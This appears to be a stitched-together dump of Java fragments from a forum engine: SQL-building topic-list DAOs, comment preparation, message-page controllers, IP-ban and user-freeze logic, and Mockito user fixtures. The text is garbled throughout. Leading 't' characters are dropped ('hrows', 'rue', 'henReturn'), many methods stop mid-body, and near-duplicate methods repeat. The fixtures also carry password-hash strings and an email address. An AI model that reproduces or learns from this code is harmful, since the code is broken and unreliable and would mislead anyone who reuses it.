( ext , msgid ) ; return msgid ; } 
public List < TopicsListItem > getGroupTrackerTopics ( int groupid , User currentUser , Date startDate , int opics , int offset , final int messagesInPage ) { return load ( " AND t.groupid = " + groupid + " " , currentUser , startDate , opics , offset , messagesInPage ) ; } 
public List < TopicsListItem > getTrackerTopics ( TrackerFilterEnum filter , User currentUser , Date startDate , int opics , int offset , final int messagesInPage ) { String partFilter ; switch ( filter ) { case ALL : partFilter = " " ; break ; case NOTALKS : partFilter = queryPartNoTalks ; break ; case MAIN : partFilter = queryPartMain ; break ; case TECH : partFilter = queryPartTech ; break ; default : partFilter = " " ; } return load ( partFilter , currentUser , startDate , opics , offset , messagesInPage ) ; } 
public List < TopicsListItem > getGroupTopics ( Group group , int messagesInPage , Integer year , Integer month , int opics , int offset , boolean showDeleted , boolean showIgnored , @Nullable User currentUser ) { String delq = showDeleted ? " " : " AND NOT deleted " ; String ignq = " " ; String commentIgnq = " " ; if ( ! showIgnored & & currentUser ! = null ) { int currentUserId = currentUser . getId ( ) ; ignq = " AND topics.userid NOT IN (SELECT ignored FROM ignore_list WHERE userid= " + currentUserId + ')' ; ignq + = " AND topics.id NOT IN (select distinct tags.msgid from tags, user_tags " + " where tags.tagid=user_tags.tag_id and user_tags.is_favorite = false and user_id= " + currentUserId + " ) " ; commentIgnq = " AND comments.userid NOT IN (SELECT ignored FROM ignore_list WHERE userid= " + currentUserId + ')' ; } String q = " SELECT topics.title as subj, lastmod, userid, topics.id as msgid, deleted, topics.stat1, topics.sticky, topics.resolved, " + " (SELECT max(postdate) FROM comments WHERE topic=topics.id AND NOT comments.deleted " + commentIgnq + " ) as commentdate " + " FROM topics WHERE NOT draft AND NOT sticky AND topics.groupid= " + group . getId ( ) + delq ; if ( year ! = null ) { q + = " AND postdate>=' " + year + '-' + month + " -01'::timestamp AND (postdate<' " + year + '-' + month + " -01'::timestamp+'1 month'::interval) " ; } if ( year = = null ) { if ( offset = = 0 ) { q + = " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ; } } return jdbcTemplate . getJdbcOperations ( ) . query ( q + ignq + " ORDER BY postdate DESC LIMIT " + opics + " OFFSET " + offset , 
public List < TopicsListItem > getGroupStickyTopics ( Group group , int messagesInPage ) { String q = " SELECT topics.title as subj, lastmod, userid, topics.id as msgid, deleted, topics.stat1, topics.sticky, topics.resolved, " + " (SELECT max(postdate) FROM comments WHERE topic=topics.id AND NOT comments.deleted) as commentdate " + " FROM topics WHERE sticky AND NOT deleted AND topics.groupid=? ORDER BY postdate DESC " ; return jdbcTemplate . getJdbcOperations ( ) . query ( q , groupListMapper ( group , messagesInPage ) , group . getId ( ) ) ; } 
private RowMapper < TopicsListItem > groupListMapper ( Group group , int messagesInPage ) { return ( rs , rowNum ) - > { User author ; 
private ImmutableMap < String , Object > prepareModel ( AddTopicRequest form , User currentUser ) { ImmutableMap . Builder < String , Object > params = ImmutableMap . builder ( ) ; Group group = form . getGroup ( ) ; if ( group ! = null ) { params . put ( " group " , group ) ; params . put ( " postscoreInfo " , groupPermissionService . getPostScoreInfo ( group ) ) ; params . put ( " showAllowAnonymous " , groupPermissionService . enableAllowAnonymousCheckbox ( group , currentUser ) ) ; Section section = sectionService . getSection ( group . getSectionId ( ) ) ; params . put ( " section " , section ) ; String addInfo = sectionService . getAddInfo ( group . getSectionId ( ) ) ; if ( addInfo ! = null ) { params . put ( " addportal " , addInfo ) ; } params . put ( " imagepost " , groupPermissionService . isImagePostingAllowed ( section , currentUser ) ) ; } return params . build ( ) ; } 
public boolean isAllowAnonymous ( ) { return allowAnonymous ; } 
public int saveNewMessage ( final Topic msg , final User user , MessageText ext , final String userAgent , final Group group ) { final int msgid = allocateMsgid ( ) ; String url = msg . getUrl ( ) ; String linktext = msg . getLinktext ( ) ; final String finalUrl = url ; final String finalLinktext = linktext ; jdbcTemplate . execute ( " INSERT INTO topics (groupid, userid, title, url, moderate, postdate, id, linktext, deleted, ua_id, postip, draft, lastmod, allow_anonymous) VALUES (?, ?, ?, ?, 'f', CURRENT_TIMESTAMP, ?, ?, 'f', create_user_agent(?),?::inet, ?, CURRENT_TIMESTAMP, ?) " , ( PreparedStatementCallback < String > ) pst - > { pst . setInt ( 1 , group . getId ( ) ) ; pst . setInt ( 2 , user . getId ( ) ) ; pst . setString ( 3 , msg . getTitle ( ) ) ; pst . setString ( 4 , finalUrl ) ; pst . setInt ( 5 , msgid ) ; pst . setString ( 6 , finalLinktext ) ; pst . setString ( 7 , userAgent ) ; pst . setString ( 8 , msg . getPostIP ( ) ) ; pst . setBoolean ( 9 , msg . isDraft ( ) ) ; pst . setBoolean ( 10 , msg . isAllowAnonymous ( ) ) ; pst . executeUpdate ( ) ; return null ; } ) ; msgbaseDao . saveNewMessage ( ext , msgid ) ; return msgid ; } 
public ImageInfo scale ( int maxDimension ) { if ( width < = maxDimension & & height < = maxDimension ) { return his ; 
protected ModelAndView getData ( HttpServletRequest request ) hrows Exception { final Poll poll = pollDao . getMostRecentPoll ( ) ; Topic msg = messageDao . getById ( poll . getTopic ( ) ) ; int count = pollDao . getVotersCount ( poll . getId ( ) ) ; int countUsers = pollDao . getCountUsers ( poll ) ; ModelAndView result = new ModelAndView ( " boxlets/poll " ) ; result . addObject ( " poll " , poll ) ; result . addObject ( " count " , count ) ; result . addObject ( " message " , msg ) ; result . addObject ( " countUsers " , countUsers ) ; return result ; } 
public boolean hasAnswers ( ) { return ! childs . isEmpty ( ) ; } 
public List < PreparedComment > prepareCommentList ( @Nonnull CommentList comments , @Nonnull List < Comment > list , @Nonnull Template mpl , @Nonnull Topic opic ) hrows UserNotFoundException { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } Map < Integer , MessageText > exts = msgbaseDao . getMessageText ( Lists . ransform ( list , Comment : : getId ) ) ; Map < Integer , User > users = loadUsers ( Iterables . ransform ( list , Comment : : getUserid ) ) ; User currentUser = mpl . getCurrentUser ( ) ; Map < Integer , Remark > remarks ; if ( currentUser ! = null ) { remarks = remarkDao . getRemarks ( currentUser , users . values ( ) ) ; } else { remarks = ImmutableMap . of ( ) ; } List < PreparedComment > commentsPrepared = list . stream ( ) . map ( comment - > { MessageText ext = exts . get ( comment . getId ( ) ) ; User author = users . get ( comment . getUserid ( ) ) ; Remark remark = remarks . get ( author . getId ( ) ) ; String remarkText = null ; if ( remark ! = null ) { remarkText = remark . getText ( ) ; } return prepareComment ( ext , author , remarkText , comment , comments , mpl , opic ) ; } ) . collect ( Collectors . oList ( ) ) ; return commentsPrepared ; } 
private PreparedComment prepareComment ( @Nonnull Comment comment ) hrows UserNotFoundException { MessageText messageText = msgbaseDao . getMessageText ( comment . getId ( ) ) ; User author = userDao . getUserCached ( comment . getUserid ( ) ) ; return prepareComment ( messageText , author , null , comment , null , null , null , ImmutableSet . of ( ) ) ; } 
public List < PreparedComment > prepareCommentList ( @Nonnull CommentList comments , @Nonnull List < Comment > list , @Nonnull Template mpl , @Nonnull Topic opic , Set < Integer > hideSet ) hrows UserNotFoundException { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } Map < Integer , MessageText > exts = msgbaseDao . getMessageText ( Lists . ransform ( list , Comment : : getId ) ) ; Map < Integer , User > users = loadUsers ( Iterables . ransform ( list , Comment : : getUserid ) ) ; User currentUser = mpl . getCurrentUser ( ) ; Map < Integer , Remark > remarks ; if ( currentUser ! = null ) { remarks = remarkDao . getRemarks ( currentUser , users . values ( ) ) ; } else { remarks = ImmutableMap . of ( ) ; } List < PreparedComment > commentsPrepared = list . stream ( ) . map ( comment - > { MessageText ext = exts . get ( comment . getId ( ) ) ; User author = users . get ( comment . getUserid ( ) ) ; Remark remark = remarks . get ( author . getId ( ) ) ; String remarkText = null ; if ( remark ! = null ) { remarkText = remark . getText ( ) ; } return prepareComment ( ext , author , remarkText , comment , comments , mpl , opic , hideSet ) ; } ) . collect ( Collectors . oList ( ) ) ; return commentsPrepared ; } 
public void foreach ( Consumer < Comment > consumer ) { if ( comment ! = null ) { consumer . accept ( comment ) ; } for ( CommentNode child : childs ) { child . foreach ( consumer ) ; 
private void hideNode ( Set < Integer > hideSet ) { foreach ( c - > hideSet . add ( c . getId ( ) ) ) ; } 
public List < PreparedComment > prepareCommentList ( @Nonnull CommentList comments , @Nonnull List < Comment > list , @Nonnull Template mpl , @Nonnull Topic opic , Set < Integer > hideSet ) hrows UserNotFoundException { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } Map < Integer , MessageText > exts = msgbaseDao . getMessageText ( Lists . ransform ( list , Comment : : getId ) ) ; Map < Integer , User > users = loadUsers ( Iterables . ransform ( list , Comment : : getUserid ) ) ; User currentUser = mpl . getCurrentUser ( ) ; Map < Integer , Remark > remarks ; if ( currentUser ! = null ) { remarks = remarkDao . getRemarks ( currentUser , users . values ( ) ) ; } else { remarks = ImmutableMap . of ( ) ; } return list . stream ( ) . map ( comment - > { MessageText ext = exts . get ( comment . getId ( ) ) ; 
public ModelAndView getMessageNewMain ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @RequestParam ( value = " skipdeleted " , required = false , defaultValue = " false " ) boolean skipDeleted , @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid , skipDeleted ) ; } Section section = sectionService . getSectionByName ( sectionName ) ; boolean rss = request . getParameter ( " output " ) ! = null & & " rss " . equals ( request . getParameter ( " output " ) ) ; if ( rss ) { return getMessageRss ( section , request , response , groupName , msgid ) ; 
public ModelAndView getMessageNewPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) hrows Exception { Section section = sectionService . getSectionByName ( sectionName ) ; return getMessageNew ( section , webRequest , request , response , page , filter , groupName , msgid , 0 ) ; } 
public ModelAndView getMessageThread ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " skipdeleted " , required = false , defaultValue = " false " ) boolean skipDeleted , @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " hreadRoot " ) int hreadRoot ) hrows Exception { Section section = sectionService . getSectionByName ( sectionName ) ; return getMessageNew ( section , webRequest , request , response , 0 , filter , groupName , msgid , hreadRoot ) ; } 
public ModelAndView getMessageOld ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " page " , required = false ) Integer page , @RequestParam ( value = " lastmod " , required = false ) Long lastmod , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( required = false ) String output ) hrows Exception { Topic opic = messageDao . getById ( msgid ) ; StringBuilder link = new StringBuilder ( opic . getLink ( ) ) ; StringBuilder params = new StringBuilder ( ) ; if ( page ! = null ) { link . append ( " /page " ) . append ( page ) ; } if ( lastmod ! = null & & ! opic . isExpired ( ) ) { params . append ( " ?lastmod= " ) . append ( opic . getLastModified ( ) . getTime ( ) ) ; } if ( filter ! = null ) { if ( params . length ( ) = = 0 ) { params . append ( '?' ) ; } else { params . append ( '&' ) ; } params . append ( " filter= " ) . append ( filter ) ; } if ( output ! = null ) { if ( params . length ( ) = = 0 ) { params . append ( '?' ) ; } else { params . append ( '&' ) ; } params . append ( " output= " ) . append ( output ) ; } link . append ( params ) ; return new ModelAndView ( new RedirectView ( link . oString ( ) ) ) ; } 
public ModelAndView jumpMessage ( HttpServletRequest request , @RequestParam int msgid , @RequestParam ( required = false ) Integer page , @RequestParam ( required = false ) Integer cid ) hrows Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid , false ) ; } Topic opic = messageDao . getById ( msgid ) ; TopicLinkBuilder builder ; if ( page ! = null ) { builder = TopicLinkBuilder . pageLink ( opic , page ) ; } else { builder = TopicLinkBuilder . baseLink ( opic ) ; } return new ModelAndView ( new RedirectView ( builder . build ( ) ) ) ; } 
private PreparedComment prepareComment ( @Nonnull Comment comment ) hrows UserNotFoundException { MessageText messageText = msgbaseDao . getMessageText ( comment . getId ( ) ) ; User author = userDao . getUserCached ( comment . getUserid ( ) ) ; return prepareComment ( messageText , author , null , comment , null , null , null , ImmutableSet . of ( ) , null ) ; } 
public List < PreparedComment > prepareCommentList ( @Nonnull CommentList comments , @Nonnull List < Comment > list , @Nonnull Template mpl , @Nonnull Topic opic , Set < Integer > hideSet ) hrows UserNotFoundException { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } Map < Integer , MessageText > exts = msgbaseDao . getMessageText ( Lists . ransform ( list , Comment : : getId ) ) ; Map < Integer , User > users = loadUsers ( Iterables . ransform ( list , Comment : : getUserid ) ) ; User currentUser = mpl . getCurrentUser ( ) ; Map < Integer , Remark > remarks ; if ( currentUser ! = null ) { remarks = remarkDao . getRemarks ( currentUser , users . values ( ) ) ; } else { remarks = ImmutableMap . of ( ) ; } Set < Integer > samePageComments = list . stream ( ) . map ( Comment : : getId ) . collect ( Collectors . oSet ( ) ) ; return list . stream ( ) . map ( comment - > { MessageText ext = exts . get ( comment . getId ( ) ) ; 
public boolean isAnswerSamepage ( ) { return answerSamepage ; } 
public CommentNode build ( ) { return new CommentNode ( comment , Lists . ransform ( childs , CommentNodeBuilder : : build ) ) ; } 
public List < Topic > getTopicsFeed ( Section section , Group group , String ag , Integer offset , Integer year , Integer month , int count , @Nullable User currentUser ) hrows TagNotFoundException { logger . debug ( " TopicListService.getTopicsFeed() " + " ; section= " + ( ( section ! = null ) ? section . oString ( ) : " (null) " ) + " ; group= " + ( ( group ! = null ) ? group . oString ( ) : " (null) " ) + " ; tag= " + ag + " ; offset= " + offset + " ; year= " + year + " ; month= " + month ) ; TopicListDto opicListDto = new TopicListDto ( ) ; if ( section ! = null ) { opicListDto . setSection ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { opicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { opicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { opicListDto . setGroup ( group . getId ( ) ) ; } if ( ag ! = null ) { opicListDto . setTag ( agService . getTagId ( ag ) ) ; } if ( month ! = null & & year ! = null ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 , 0 , 0 , 0 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; opicListDto . setToDate ( calendar . getTime ( ) ) ; } else { opicListDto . setLimit ( count ) ; opicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( ag = = null & & group = = null & & ! section . isPremoderated ( ) ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return opicListDao . getTopics ( opicListDto , currentUser ) ; } 
public List < Topic > getRssTopicsFeed ( Section section , Group group , Date fromDate , boolean noTalks , boolean ech ) { logger . debug ( " TopicListService.getRssTopicsFeed() " + " ; section= " + ( ( section ! = null ) ? section . oString ( ) : " (null) " ) + " ; group= " + ( ( group ! = null ) ? group . oString ( ) : " (null) " ) + " ; fromDate= " + fromDate + " ; noTalks= " + noTalks + " ; tech= " + ech ) ; TopicListDto opicListDto = new TopicListDto ( ) ; if ( section ! = null ) { opicListDto . setSection ( section . getId ( ) ) ; } if ( group ! = null ) { opicListDto . setGroup ( group . getId ( ) ) ; } opicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; opicListDto . setFromDate ( fromDate ) ; opicListDto . setNotalks ( noTalks ) ; opicListDto . setTech ( ech ) ; opicListDto . setLimit ( 20 ) ; if ( section . isPremoderated ( ) ) { opicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { opicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } return opicListDao . getTopics ( opicListDto , null ) ; } 
public List < Topic > getAllTopicsFeed ( Section section , Date fromDate ) { logger . debug ( " TopicListService.getAllTopicsFeed() " + " ; section= " + ( ( section ! = null ) ? section . oString ( ) : " (null) " ) + " ; fromDate= " + fromDate ) ; TopicListDto opicListDto = new TopicListDto ( ) ; opicListDto . setCommitMode ( TopicListDao . CommitMode . UNCOMMITED_ONLY ) ; if ( section ! = null ) { opicListDto . setSection ( section . getId ( ) ) ; } opicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; opicListDto . setFromDate ( fromDate ) ; return opicListDao . getTopics ( opicListDto , null ) ; } 
public ModelAndView banIP ( HttpServletRequest request , @RequestParam ( " ip " ) String ip , @RequestParam ( " reason " ) String reason , @RequestParam ( " ime " ) String ime , @RequestParam ( value = " allow_posting " , required = false , defaultValue = " false " ) boolean allowPosting , @RequestParam ( value = " captcha_required " , required = false , defaultValue = " false " ) boolean captchaRequired ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new IllegalAccessException ( " Not authorized " ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; if ( " hour " . equals ( ime ) ) { calendar . add ( Calendar . HOUR_OF_DAY , 1 ) ; } else if ( " day " . equals ( ime ) ) { calendar . add ( Calendar . DAY_OF_MONTH , 1 ) ; } else if ( " month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 1 ) ; } else if ( " 3month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 3 ) ; } else if ( " 6month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 6 ) ; } else if ( " remove " . equals ( ime ) ) { } else if ( " custom " . equals ( ime ) ) { int days = ServletRequestUtils . getRequiredIntParameter ( request , " ban_days " ) ; if ( days < = 0 | | days > 180 ) { hrow new UserErrorException ( " Invalid days count " ) ; } calendar . add ( Calendar . DAY_OF_MONTH , days ) ; } Timestamp s ; if ( " unlim " . equals ( ime ) ) { s = null ; } else { s = new Timestamp ( calendar . getTimeInMillis ( ) ) ; } User user = mpl . getCurrentUser ( ) ; user . checkCommit ( ) ; ipBlockDao . blockIP ( ip , user . getId ( ) , reason , s , allowPosting , captchaRequired ) ; return new ModelAndView ( new RedirectView ( " sameip.jsp?ip= " + URLEncoder . encode ( ip , StandardCharsets . UTF_8 ) ) ) ; } 
public void blockIP ( String ip , int moderatorId , String reason , Timestamp banUntil , boolean allow_posting , boolean captcha_required ) { IPBlockInfo blockInfo = getBlockInfo ( ip ) ; if ( ! blockInfo . isInitialized ( ) ) { jdbcTemplate . update ( 
public List < Topic > getRssTopicsFeed ( Section section , Group group , Date fromDate , boolean noTalks , boolean ech ) { logger . debug ( " TopicListService.getRssTopicsFeed() " + " ; section= " + ( ( section ! = null ) ? section . oString ( ) : " (null) " ) + " ; group= " + ( ( group ! = null ) ? group . oString ( ) : " (null) " ) + " ; fromDate= " + fromDate + " ; noTalks= " + noTalks + " ; tech= " + ech ) ; TopicListDto opicListDto = new TopicListDto ( ) ; if ( section ! = null ) { opicListDto . setSection ( section . getId ( ) ) ; } if ( group ! = null ) { opicListDto . setGroup ( group . getId ( ) ) ; } opicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; opicListDto . setFromDate ( fromDate ) ; opicListDto . setNotalks ( noTalks ) ; opicListDto . setTech ( ech ) ; opicListDto . setLimit ( 100 ) ; if ( section . isPremoderated ( ) ) { opicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { opicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } return opicListDao . getTopics ( opicListDto , null ) ; } 
public void freezeUser ( @Nonnull User user , @Nonnull User moderator , @Nonnull String reason , @Nonnull Timestamp until ) { jdbcTemplate . update ( " UPDATE users SET frozen_until=?,frozen_by=?,freezing_reason=? WHERE id=? " , until , moderator . getId ( ) , reason , user . getId ( ) ) ; userLogDao . logFreezeUser ( user , moderator , reason , until ) ; } 
public void logFreezeUser ( @Nonnull User user , @Nonnull User moderator , @Nonnull String reason , @Nonnull Timestamp until ) { Timestamp now = new Timestamp ( System . currentTimeMillis ( ) ) ; UserLogAction action = UserLogAction . FROZEN ; the action may be not consistent with database (e.g. with real action) if the 'until' is close to the now, but we don't have to worry about it, since, it's not about real use cases if (until.before(now)) { action = UserLogAction.DEFROSTED; } jdbcTemplate.update( "INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?)", 
public boolean isFrozen ( ) { if ( frozenUntil = = null ) { return false ; } return frozenUntil . after ( new Timestamp ( System . currentTimeMillis ( ) ) ) ; } 
public boolean isCommentsAllowed ( Group group , Topic opic , User user ) { if ( user ! = null & & ( user . isBlocked ( ) | | user . isFrozen ( ) ) ) { return false ; } if ( opic . isDeleted ( ) | | opic . isExpired ( ) | | opic . isDraft ( ) ) { return false ; } int score = getPostscore ( group , opic ) ; if ( score = = POSTSCORE_UNRESTRICTED ) { return rue ; } if ( user = = null | | user . isAnonymous ( ) ) { return false ; } if ( user . isModerator ( ) ) { return rue ; } if ( score = = POSTSCORE_REGISTERED_ONLY ) { return rue ; } if ( score = = POSTSCORE_MODERATORS_ONLY ) { return false ; } boolean isAuthor = user . getId ( ) = = opic . getUid ( ) ; if ( score = = POSTSCORE_MOD_AUTHOR ) { return isAuthor ; } if ( isAuthor ) { return rue ; 
public static ResultSet getHizel ( ) hrows Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . henReturn ( 34590 ) ; when ( resultSet . getString ( " nick " ) ) . henReturn ( " hizel " ) ; when ( resultSet . getString ( " style " ) ) . henReturn ( " ango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " blocked " ) ) . henReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . henReturn ( 45 ) ; when ( resultSet . getInt ( " max_score " ) ) . henReturn ( 45 ) ; when ( resultSet . getString ( " name " ) ) . henReturn ( " " ) ; when ( resultSet . getString ( " passwd " ) ) . henReturn ( " DffBkILVpGCDTC8ykceJzvcj5dJbhF38 " ) ; when ( resultSet . getString ( " photo " ) ) . henReturn ( " " ) ; when ( resultSet . getString ( " email " ) ) . henReturn ( " hz@vyborg.ru " ) ; when ( resultSet . getInt ( " unread_events " ) ) . henReturn ( 0 ) ; when ( resultSet . getTimestamp ( " frozen_until " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " frozen_by " ) ) . henReturn ( 0 ) ; when ( resultSet . getString ( " freezing_reason " ) ) . henReturn ( " " ) ; return resultSet ; } 
public static ResultSet getAnonymous ( ) hrows Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . henReturn ( 2 ) ; when ( resultSet . getString ( " nick " ) ) . henReturn ( " anonymous " ) ; when ( resultSet . getString ( " style " ) ) . henReturn ( " ango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " blocked " ) ) . henReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . henReturn ( - 117654 ) ; when ( resultSet . getInt ( " max_score " ) ) . henReturn ( 4 ) ; when ( resultSet . getString ( " name " ) ) . henReturn ( " Anonymous " ) ; when ( resultSet . getString ( " passwd " ) ) . henReturn ( null ) ; when ( resultSet . getString ( " photo " ) ) . henReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . henReturn ( 161 ) ; when ( resultSet . getTimestamp ( " frozen_until " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " frozen_by " ) ) . henReturn ( 0 ) ; when ( resultSet . getString ( " freezing_reason " ) ) . henReturn ( " " ) ; return resultSet ; } 
public static ResultSet getModerator ( ) hrows Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . henReturn ( 5280 ) ; when ( resultSet . getString ( " nick " ) ) . henReturn ( " svu " ) ; when ( resultSet . getString ( " style " ) ) . henReturn ( " ango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " candel " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " blocked " ) ) . henReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . henReturn ( 500 ) ; when ( resultSet . getInt ( " max_score " ) ) . henReturn ( 500 ) ; when ( resultSet . getString ( " name " ) ) . henReturn ( " Sergey V. Udaltsov " ) ; when ( resultSet . getString ( " passwd " ) ) . henReturn ( " 0vwkMky44u8kIqSasrH+X8mHao1a3jOC " ) ; when ( resultSet . getString ( " photo " ) ) . henReturn ( " 5280.png " ) ; when ( resultSet . getString ( " email " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . henReturn ( 2 ) ; when ( resultSet . getTimestamp ( " frozen_until " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " frozen_by " ) ) . henReturn ( 0 ) ; when ( resultSet . getString ( " freezing_reason " ) ) . henReturn ( " " ) ; return resultSet ; } 
public static ResultSet getUser5star ( ) hrows Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . henReturn ( 13 ) ; when ( resultSet . getString ( " nick " ) ) . henReturn ( " user5star " ) ; when ( resultSet . getString ( " style " ) ) . henReturn ( " ango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " blocked " ) ) . henReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . henReturn ( 500 ) ; when ( resultSet . getInt ( " max_score " ) ) . henReturn ( 500 ) ; when ( resultSet . getString ( " name " ) ) . henReturn ( " 5 star " ) ; when ( resultSet . getString ( " passwd " ) ) . henReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . henReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . henReturn ( 13 ) ; when ( resultSet . getTimestamp ( " frozen_until " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " frozen_by " ) ) . henReturn ( 0 ) ; when ( resultSet . getString ( " freezing_reason " ) ) . henReturn ( " " ) ; return resultSet ; } 
public static ResultSet getUser1star ( ) hrows Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . henReturn ( 14 ) ; when ( resultSet . getString ( " nick " ) ) . henReturn ( " user1star " ) ; when ( resultSet . getString ( " style " ) ) . henReturn ( " ango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " blocked " ) ) . henReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . henReturn ( 110 ) ; when ( resultSet . getInt ( " max_score " ) ) . henReturn ( 110 ) ; when ( resultSet . getString ( " name " ) ) . henReturn ( " 1 star " ) ; when ( resultSet . getString ( " passwd " ) ) . henReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . henReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . henReturn ( 13 ) ; when ( resultSet . getTimestamp ( " frozen_until " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " frozen_by " ) ) . henReturn ( 0 ) ; when ( resultSet . getString ( " freezing_reason " ) ) . henReturn ( " " ) ; return resultSet ; } 
